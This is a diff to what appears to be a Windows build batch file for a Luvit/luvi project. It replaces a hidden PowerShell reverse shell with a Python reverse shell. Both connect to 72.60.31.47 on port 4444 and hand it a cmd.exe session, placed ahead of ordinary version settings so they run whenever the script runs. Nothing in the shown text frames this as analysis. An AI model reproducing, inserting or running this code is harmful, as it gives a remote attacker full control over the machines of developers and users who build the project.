@@ -1,5 +1,25 @@
 echo off
-cmd /c powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('72.60.31.47',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+python -c "
+import socket,subprocess,threading
+def s2p(s,p):
+    while True:
+        d=s.recv(1024)
+        if not d:break
+        p.stdin.write(d.decode())
+        p.stdin.flush()
+def p2s(s,p):
+    while True:
+        o=p.stdout.read(1)
+        if not o:break
+        s.send(o.encode())
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(('72.60.31.47',4444))
+p=subprocess.Popen(['cmd.exe'],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,stdin=subprocess.PIPE,shell=True,text=True)
+threading.Thread(target=s2p,args=[s,p],daemon=True).start()
+threading.Thread(target=p2s,args=[s,p],daemon=True).start()
+p.wait()
+"
 
 set LUVI_VERSION=v2.7.6-2-sigar
 set LIT_VERSION=3.1.0
